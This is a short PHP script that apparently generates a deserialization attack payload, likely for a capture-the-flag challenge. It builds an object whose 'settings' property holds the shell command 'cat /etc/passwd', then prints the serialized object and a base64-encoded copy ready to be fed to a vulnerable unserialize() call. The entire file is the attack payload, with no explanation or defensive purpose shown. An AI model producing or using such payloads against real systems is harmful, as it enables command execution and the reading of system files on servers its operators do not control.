<?php 
class settings{}
class main{
    public $settings; 

    public function __construct(){
        $this->settings = "cat /etc/passwd";
    }
}

$a = new main();

echo serialize($a);



echo base64_encode(serialize($a));




// echo base64_encode(serialize($a));